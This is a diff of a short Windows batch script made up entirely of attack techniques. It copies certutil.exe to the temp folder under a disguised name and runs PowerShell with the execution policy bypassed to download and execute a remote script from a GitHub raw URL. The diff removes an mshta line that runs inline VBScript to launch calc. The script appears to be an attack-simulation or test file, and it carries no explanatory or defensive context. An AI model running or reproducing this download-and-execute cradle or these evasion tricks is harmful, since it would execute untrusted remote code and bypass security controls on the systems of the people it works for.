@@ -1,6 +1,5 @@
 @echo on
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
-mshta.exe javascript:"<script language=vbscript>createobject(\"WScript.Shell\").run(\"calc\")\r\nclose()</script>
 
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
 
